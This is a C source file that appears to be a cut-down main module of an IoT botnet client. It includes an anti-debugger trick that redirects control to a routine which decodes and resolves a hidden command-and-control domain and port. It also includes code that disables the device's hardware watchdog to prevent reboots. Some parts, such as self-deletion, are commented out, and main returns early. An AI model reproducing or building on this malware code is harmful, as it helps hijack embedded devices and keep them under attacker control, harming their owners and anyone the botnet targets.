#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>

#include "includes.h"
#include "table.h"
#include "rand.h"
#include "util.h"
#include "resolv.h"

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1;
BOOL pending_connection = FALSE;
void (*resolve_func)(void) = (void (*)(void))util_local_addr; // Overridden in anti_gdb_entry

#ifdef DEBUG
static void segv_handler(int sig, siginfo_t *si, void *unused)
{
    printf("Got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
    exit(EXIT_FAILURE);
}
#endif

int main(int argc, char **args)
{
    char *tbl_exec_succ;
    char name_buf[32];
    char id_buf[32];
    int name_buf_len;
    int tbl_exec_succ_len;
    int pgid, pings = 0;

#ifndef DEBUG
    sigset_t sigs;
    int wfd;

    // Delete self
    // unlink(args[0]);

    // // Signal based control flow
    // sigemptyset(&sigs);
    // sigaddset(&sigs, SIGINT);
    // sigprocmask(SIG_BLOCK, &sigs, NULL);
    // signal(SIGCHLD, SIG_IGN);
    // signal(SIGTRAP, &anti_gdb_entry);

    // Prevent watchdog from rebooting device
    if ((wfd = open("/dev/watchdog", 2)) != -1 ||
        (wfd = open("/dev/misc/watchdog", 2)) != -1)
    {
        int one = 1;

        ioctl(wfd, 0x80045704, &one);
        close(wfd);
        wfd = 0;
    }
    chdir("/");
#endif
    return 0;
}

static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}

static void resolve_cnc_addr(void)
{
    struct resolv_entries *entries;

    table_unlock_val(TABLE_CNC_DOMAIN);
    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
    table_lock_val(TABLE_CNC_DOMAIN);
    if (entries == NULL)
    {
#ifdef DEBUG
        printf("[main] Failed to resolve CNC address\n");
#endif
        return;
    }
    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    resolv_entries_free(entries);

    table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
    table_lock_val(TABLE_CNC_PORT);

#ifdef DEBUG
    printf("[main] Resolved domain\n");
#endif
}
